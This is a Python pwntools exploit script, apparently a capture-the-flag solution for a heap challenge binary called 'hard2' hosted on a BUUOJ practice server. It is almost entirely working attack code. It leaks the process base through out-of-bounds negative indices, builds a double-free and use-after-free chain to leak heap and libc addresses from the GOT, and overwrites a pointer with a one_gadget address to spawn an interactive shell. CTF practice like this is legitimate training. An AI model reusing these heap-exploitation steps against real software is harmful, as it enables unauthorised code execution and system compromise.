from pwn import *
context.binary = './hard2'
#context.log_level = 'debug'
context.timeout = None
elf = context.binary

if args['REMOTE']:
	p = remote('pwn.buuoj.cn', 20001)
	libc = ELF('./libc.so.6')
else:
	libc = context.binary.libc
	p = process('./hard2')

def dbg():
	raw_input()

def create(content):
	p.recvuntil('> ')
	p.sendline('1')
	p.recvuntil('content: ')
	p.send(content)
	print "create a chunk success"

def show(idx):
	p.recvuntil('> ')
	p.sendline('2')
	p.recvuntil('id: ')
	p.sendline(str(idx))
	print "show %d chunk success" % idx

def free(idx):
	p.recvuntil('> ')
	p.sendline('3')
	p.recvuntil('id: ')
	p.sendline(str(idx))
	print "free chunk %d success " % idx

#leak process base address
show(0xffffffff - 18)
p.recvuntil('context: ')
procbase = u64(p.recv(6).ljust(8, '\x00'))
print "procbase ==> " + hex(procbase)

for i in range(0, 0x30):			#make cnt[0] = 0x2f so free will leavel two same pointers in array
	create(str(i))

for i in range(0xd):			#make cnt[0] = 0x21, so make a fake chunk
	free(0)						


#over write cnt
free(0xffffffff - 4)

#use after free
#leak heap
free(0x2e)							#array[0x2e] == arrary[0x2f]
show(0x2e)
p.recvuntil('context: ')
heapbase = u64(p.recv(8)) - 0x180
print "heapbase ==> " + hex(heapbase)

#leak libc
free(0)							#
free(0x2e)						#				
free(0xffffffff - 5)			#free(0)    make cnt[0] = 0

fake_chunk = 0x202068 + procbase
fake_got = fake_chunk + 0x10

#now chunk_2e -> chunk0 -> chunk->chunk_2    (double free chain)
create(p64(procbase + 0x202068))			#freed's 0x2e, fd
create('a'*4)								#
create('b'*4)								#freed's 0x2e

create(p64(procbase + elf.got['free']) + p64(0x21))		#fd, fake_got = free_got
show(0xffffffff - 4)				#show(fake_chunk + 0x10)   here is free_got

p.recvuntil('context: ')
libc_base = u64(p.recv(6).ljust(8,'\x00')) - libc.symbols['free']
log.success('libc base => ' + hex(libc_base))

#gdb.attach(p, 'b write')

#get shell
for i in range(3):			#like before, 
	free(1)					#2e -> 0 -> 2e (double free chain)
create(p64(procbase+0x202078))
create('a'*8)
create('a'*8)

gadgets = [0x4526a, 0x45216, 0xf02a4, 0xf1147]
#Create(p64(libc_base+libc.symbols['system']))
create(p64(libc_base+gadgets[2]))
p.recvuntil('> ')
p.sendline('5')


p.interactive()
p.close()